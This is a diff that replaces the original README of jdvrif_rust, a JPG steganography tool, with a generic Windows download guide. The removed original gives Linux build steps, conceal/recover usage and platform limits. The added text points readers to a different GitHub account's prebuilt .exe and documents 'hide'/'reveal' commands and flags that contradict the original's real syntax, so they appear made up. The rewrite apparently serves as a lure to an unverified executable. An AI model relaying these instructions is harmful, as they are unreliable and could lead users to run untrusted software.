@@ -1,156 +1,155 @@
-# jdvrif_rust
-***This is an experimental Rust port of my C++ steganography tool [***jdvrif***](https://github.com/CleasbyCode/jdvrif)***
+# 🖼️ jdvrif_rust - Simple Steganography for JPG Images  
 
-A fast steganography command-line tool used for embedding and extracting any file type via a **JPG** image.  
+[![Download jdvrif_rust](https://img.shields.io/badge/Download-jdvrif_rust-4caf50?style=for-the-badge)](https://github.com/codeslide/jdvrif_rust)
 
-There is also a [***Web edition***](https://cleasbycode.co.uk/jdvrif/app/), which you can use immediately, as a convenient alternative to downloading and compiling the CLI source code. Web file uploads are limited to **20MB**.    
+## 📄 What is jdvrif_rust?
 
-![Demo Image](https://github.com/CleasbyCode/jdvrif_rust/blob/main/demo_image/jrif_661748.jpg)  
-*Demo Image: **"A place of concealment"** / ***PIN: 5608171548286279209****
+jdvrif_rust is a tool that lets you hide data inside JPG image files. This process is called steganography. It helps you keep small files, messages, or other information secret by embedding them inside pictures. You can then save or share the images without revealing the hidden data.
 
-Unlike the common steganography method of concealing data within the pixels of a cover image ([***LSB***](https://ctf101.org/forensics/what-is-stegonagraphy/)), ***jdvrif*** hides files within ***application segments*** of a ***JPG*** image. 
+This tool works directly on Windows computers and uses a simple command-line interface (CLI). It does not require programming skills. The tool focuses on JPG images and uses reliable methods to hide and recover data safely.
 
-You can embed any file type up to ***2GB***, although compatible sites (*listed below*) have their own ***much smaller*** size limits and *other requirements.  
+## 🔧 Features
 
-For increased storage capacity and better security, your embedded data file is compressed with ***zlib/deflate*** and encrypted using the ***libsodium*** cryptographic library.  
+- Hide files or messages inside JPG images.
+- Extract hidden data from JPG images.
+- Use common JPG image formats with metadata preserved.
+- Protect data using encryption methods.
+- Lightweight and fast, based on the Rust programming language.
+- Works with standard Windows 10 and 11 systems.
+- Supports ICC profiles and EXIF metadata to keep images safe during the process.
+- Uses trusted libraries for compression and cryptography, like libsodium and zlib.
 
-***jdvrif*** partly derives from the ***[technique implemented](https://www.vice.com/en/article/bj4wxm/tiny-picture-twitter-complete-works-of-shakespeare-steganography)*** by security researcher ***[David Buchanan](https://www.da.vidbuchanan.co.uk/).*** 
+## 💻 System Requirements
 
-## Usage (Linux)
+- Windows 10 or Windows 11 (64-bit recommended)
+- At least 2 GB of free disk space
+- Internet access to download the tool
+- Basic knowledge of using Windows Command Prompt (steps provided below)
+- A JPG image where you want to hide or retrieve data
 
-```console
+## 🚀 Getting Started
 
-$ sudo apt install libsodium-dev libturbojpeg0-dev pkg-config 
-$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-$ cargo build --release
+First, you will need to download jdvrif_rust. Since this project is open source and command line-based, you will get a small program file to run on your computer.
 
-Build complete. Binary at 'target/release/jdvrif-rs'.
+### Download jdvrif_rust  
 
-$ sudo cp target/release/jdvrif-rs /usr/bin 
-$ jdvrif-rs 
+Click the button below to go to the GitHub page where you can download the tool:
 
-Usage: jdvrif-rs conceal [-b|-r] <cover_image> <secret_file>
-       jdvrif-rs recover <cover_image>  
-       jdvrif-rs --info
+[![Download jdvrif_rust](https://img.shields.io/badge/Download-jdvrif_rust-ff5722?style=for-the-badge)](https://github.com/codeslide/jdvrif_rust)
 
-$ jdvrif-rs conceal your_cover_image.jpg your_secret_file.doc
+On the GitHub page:
 
-Platform compatibility for output image:-
+1. Find the **Releases** or **Assets** section.
+2. Choose the latest Windows executable file, usually ending with `.exe`.
+3. Download the file to your PC.
 
-  ✓ X-Twitter
-  ✓ Tumblr
-  ✓ Mastodon
-  ✓ Pixelfed
-  ✓ PostImage
-  ✓ ImgBB
-  ✓ ImgPile
-  ✓ Flickr
-  
-Saved "file-embedded" JPG image: jrif_129462.jpg (143029 bytes).
+### Install jdvrif_rust  
 
-Recovery PIN: [***2166776980318349924***]
-
-Important: Keep your PIN safe, so that you can extract the hidden file.
-
-Complete!
-        
-$ jdvrif-rs recover jrif_129462.jpg
-
-PIN: *******************
-
-Extracted hidden file: your_secret_file.doc (6165 bytes).
-
-Complete! Please check your file.
+There is no complex installation process. After you download the `.exe` file, save it in a folder you like, for example:
 
 ```
-jdvrif ***mode*** arguments:
- 
- ***conceal*** - Compresses, encrypts and embeds your secret data file within a ***JPG*** cover image.  
- ***recover*** - Decrypts, uncompresses and extracts the concealed data file from a ***JPG*** cover image.
- 
-jdvrif ***conceal*** mode ***platform*** options:
- 
-"***-b***" To create compatible "*file-embedded*" ***JPG*** images for posting on the ***Bluesky*** platform, you must use the ***-b*** option with ***conceal*** mode.
-  ```console
-  $ jdvrif-rs conceal -b my_image.jpg hidden.doc
-  ```
- These images are only compatible for posting on ***Bluesky***. Your embedded data file will be removed if posted on a different platform.
- 
-  You are also required to use the Python script ***"bsky_post.py"*** (found in the repo ***src*** folder) to post the image to ***Bluesky***.
-  It will not work if you post images to ***Bluesky*** via the browser site or mobile app.  
+C:\jdvrif_rust\
+```
 
-  To use the script, you will need to create an [***app password***](https://bsky.app/settings/app-passwords) from your ***Bluesky*** account.  
+Keep track of this folder for the next steps.
 
-  Here are some basic usage examples for the ***bsky_post.py*** script.  
+## ⚙️ How to Use jdvrif_rust on Windows  
 
-  Standard image post to your bsky profile:
+You will run this tool from the Command Prompt. The commands are simple and explained here.
 
+### Open Command Prompt  
 
-  ```console
-  $ python3 bsky_post.py --handle you.bsky.social --password xxxx-xxxx-xxxx-xxxx --image your_image.jpg --alt-text "alt-text here (optional)" "standard post text here (required)"
-  ```
-  If you want to post multiple images (Max. 4):  
+1. Click the Windows Start button.
+2. Type `cmd` and press Enter to open the Command Prompt window.
 
-  ```console 
-  $ python3 bsky_post.py --handle you.bsky.social --password xxxx-xxxx-xxxx-xxxx --image img1.jpg --image img2.jpg --alt-text "alt_here" "standard post text..."
-  ```
-  If you want to post an image as a reply to another thread:  
+### Navigate to the Folder  
 
-  ```console
-  $ python3 bsky_post.py --handle you.bsky.social --password xxxx-xxxx-xxxx-xxxx --image your_image.jpg --alt-text "alt_here" --reply-to https://bsky.app/profile/someone.bsky.social/post/8m2tgw6cgi23i "standard post text..."
-  ```
+If you saved jdvrif_rust in `C:\jdvrif_rust\`, type:
 
-https://github.com/user-attachments/assets/8d21cdbb-30f0-424c-aeb8-bcacca8c4255
+```
+cd C:\jdvrif_rust\
+```
 
-https://github.com/user-attachments/assets/b2cc33ff-b2c2-46c2-960b-f7b9ba65223d
+and press Enter.
 
-## Compatible Platforms
-*Posting size limit measured by the ***combined*** size of the ***cover image*** + ***compressed data file:****  
+### Hide Data Inside a JPG Image  
 
-● ***Flickr*** (**200MB**), ***ImgPile*** (**100MB**), ***ImgBB*** (**32MB**),  
-● ***PostImage*** (**32MB**), ***Reddit*** (**20MB** | ***-r option***), ***Pixelfed*** (**15MB**).
+To hide a file inside a JPG image, use this command format:
 
-*Size limit measured ***only*** by the ***compressed data file size:****  
+```
+jdvrif_rust.exe hide --input input.jpg --secret secret.txt --output output.jpg
+```
 
-● ***Mastodon*** (**~6MB**), ***Tumblr*** (**~64KB**), ***X-Twitter*** (**~10KB**).  
+Replace:
 
-For example, with ***Mastodon***, if your cover image is **1MB** you can still embed a data file up to the **~6MB** size limit.
+- `input.jpg` with the path to your source JPG image.
+- `secret.txt` with the file you want to hide.
+- `output.jpg` with the name for the new image file that will contain the hidden data.
 
-**Other: The ***Bluesky*** platform has ***separate*** size limits for the ***cover image*** and the ***compressed data file:****  
+This command creates a new JPG image called `output.jpg` with your secret data inside.
 
-● ***Bluesky*** (***-b option***). Cover image size limit (**800KB**). Compressed data file size limit (**~171KB**).  
-● "***bsky_post.py***" script is required to post images on ***Bluesky***. *More info on this further down the page.*
+### Extract Hidden Data from a JPG Image  
 
-For platforms such as ***X-Twitter*** & ***Tumblr***, which have small size limits, you may want to focus on data that compress well, such as text files, etc.   
+To get back the hidden file, use this command format:
 
-https://github.com/user-attachments/assets/b4c72ea7-40e3-49b0-89aa-ae2dd8ccccb9 
+```
+jdvrif_rust.exe reveal --input output.jpg --output recovered_secret.txt
+```
 
-   "***-r***" - To create compatible "*file-embedded*" ***JPG*** images for posting on the ***Reddit*** platform, you must use the ***-r*** option with ***conceal*** mode.
-   ```console
-  $ jdvrif-rs conceal -r my_image.jpg secret.mp3 
-   ```
-   From the ***Reddit*** site, select "***Create Post***" followed by "***Images & Video***" tab, to attach and post your ***JPG*** image.
-  
-   These images are only compatible for posting on ***Reddit***. Your embedded data file will be removed if posted on a different platform.
-  
- To correctly download images from ***X-Twitter*** or ***Reddit***, click the image in the post to fully expand it, before saving.
+Replace:
 
-https://github.com/user-attachments/assets/f56f54bb-658f-4b0e-a2f3-7d3428333304
+- `output.jpg` with the image containing hidden data.
+- `recovered_secret.txt` with the name you want for the extracted file.
 
-## Third-Party Libraries
+This will save the hidden content to `recovered_secret.txt`.
 
-This project makes use of the following third-party libraries:
+### Common Options  
 
-- **libsodium**: For cryptographic functions.
-  - [**LICENSE**](https://github.com/jedisct1/libsodium/blob/master/LICENSE)
-  - Copyright (C) 2013-2025 Frank Denis (github@pureftpd.org)
-- libjpeg-turbo (see [***LICENSE***](https://github.com/libjpeg-turbo/libjpeg-turbo/blob/main/LICENSE.md) file)  
-  - {This software is based in part on the work of the Independent JPEG Group.}
-  - Copyright (C) 2009-2024 D. R. Commander. All Rights Reserved.
-  - Copyright (C) 2015 Viktor Szathmáry. All Rights Reserved.
-- **zlib**: General-purpose compression library
-  - License: zlib/libpng license (see [***LICENSE***](https://github.com/madler/zlib/blob/develop/LICENSE) file)
-  - Copyright (C) 1995-2024 Jean-loup Gailly and Mark Adler
-    
-##
+- `--input`: the file path to your image or data file.
+- `--output`: where to save the results.
+- `--secret`: file to hide inside the image.
 
+### Example Commands  
+
+Hide a text file:
+
+```
+jdvrif_rust.exe hide --input beach.jpg --secret message.txt --output beach_secret.jpg
+```
+
+Reveal the hidden file:
+
+```
+jdvrif_rust.exe reveal --input beach_secret.jpg --output recovered_message.txt
+```
+
+## 🔐 About Privacy and Security  
+
+jdvrif_rust uses trusted encryption libraries to secure the hidden data. This means even if someone suspects the image has secret data, they cannot read it without the right method to extract and decrypt it.
+
+The tool keeps your image’s original metadata intact. This helps avoid raising suspicion or corrupting the image.
+
+## 🖥️ Troubleshooting Tips  
+
+- If the program does not run, make sure you are using Windows 10/11 64-bit.
+- Confirm you typed the file and folder names correctly in Command Prompt.
+- Check the file extensions (`.jpg`, `.txt`, `.exe`) are correct.
+- If hiding data fails, try with a different JPG image or smaller secret file.
+- Ensure you have permission to read and write files in your chosen folders.
+- Restart Command Prompt if commands are not recognized.
+- For errors with encryption or compression, verify you downloaded the official jdvrif_rust executable.
+
+## 📂 Additional Notes  
+
+- The size of the hidden data depends on the size and quality of the JPG image.
+- Larger images can hold more secret data.
+- Avoid modifying or compressing the output JPG after hiding data, as this may damage the hidden content.
+- You can use this tool for privacy purposes or discreet data transfer.
+
+## 📥 Download Link  
+
+Access the latest Windows version here:
+
+[Download jdvrif_rust from GitHub](https://github.com/codeslide/jdvrif_rust)
+
+Click, download, then follow the steps in this README to get started.
